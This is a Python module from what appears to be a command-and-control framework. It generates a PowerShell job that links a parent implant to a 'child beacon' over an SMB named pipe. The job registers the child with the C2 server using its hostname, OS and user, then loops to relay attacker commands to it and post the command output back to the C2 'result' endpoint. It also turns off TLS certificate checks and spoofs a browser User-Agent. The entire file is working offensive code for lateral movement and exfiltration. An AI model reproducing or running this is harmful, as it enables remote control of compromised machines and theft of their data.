import json
import base64

MODULE_INFO = {
    "name": "p2p_link",
    "description": "Establish a parent bridge to a named-pipe P2P child beacon via SMB.",
    "platform": "windows"
}

def run(session, args):
    if len(args) < 2:
        return "[!] Usage: use p2p_link <target_ip> <pipe_name> [callback_url]"
    
    target_ip = args[0]
    pipe_name = args[1]
    
    # We allow overriding the callback URL because the module doesn't natively know the parent's C2
    callback_url = args[2] if len(args) > 2 else "http://localhost:8443"
    
    script = f"""
$targetIp = "{target_ip}"
$pipeName = "{pipe_name}"
$c2Url = "{callback_url}"
$parentSid = "{session}"

Start-Job -Name "P2P_Link_$targetIp" -ScriptBlock {{
    param($tIp, $pName, $c2, $pSid)
    
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}

    function Invoke-Req ($Url, $Body=$null) {{
        $params = @{{
            Uri = $Url
            UseBasicParsing = $true
            Headers = @{{"User-Agent"="Mozilla/5.0"}}
        }}
        if ($Body) {{
            $params.Method = "POST"
            $params.Body = $Body
            $params.ContentType = "application/json"
        }} else {{
            $params.Method = "GET"
        }}
        return Invoke-RestMethod @params
    }}

    try {{
        $pipe = New-Object System.IO.Pipes.NamedPipeClientStream($tIp, $pName, [System.IO.Pipes.PipeDirection]::InOut, [System.IO.Pipes.PipeOptions]::Asynchronous)
        $pipe.Connect(5000)
    }} catch {{
        Write-Error "Failed to connect to named pipe"
        exit
    }}

    $reader = New-Object System.IO.StreamReader($pipe)
    $writer = New-Object System.IO.StreamWriter($pipe)
    $writer.AutoFlush = $true

    # 1. Read sysinfo from child
    $infoJson = $reader.ReadLine()
    if (-not $infoJson) {{ exit }}
    $info = $infoJson | ConvertFrom-Json
    
    # 2. Register child with C2, passing parent_id 
    $q = "id=&hostname=$($info.hostname)&os=$($info.os)&user=$($info.user)&parent_id=$pSid"
    $resp = Invoke-Req -Url "$c2/beacon?$q"
    $childId = $resp.id

    # 3. Proxy loop
    while ($true) {{
        if (-not $pipe.IsConnected) {{ break }}
        try {{
            $resp = Invoke-Req -Url "$c2/beacon?id=$childId"
            $cmd_enc = $resp.cmd
            if ($cmd_enc -ne "NOP") {{
                $writer.WriteLine($cmd_enc)
                $out_b64 = $reader.ReadLine()
                if ($out_b64) {{
                    $out_raw = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($out_b64))
                    $body = @{{cmd_id=$resp.cmd_id; output=$out_raw; id=$childId}} | ConvertTo-Json
                    Invoke-Req -Url "$c2/result" -Body $body | Out-Null
                }}
            }}
        }} catch {{}}
        Start-Sleep -Seconds 5
    }}
}} -ArgumentList $targetIp, $pipeName, $c2Url, $parentSid

"P2P Link job started to $target_ip\\pipe\\$pipe_name"
"""
    return script
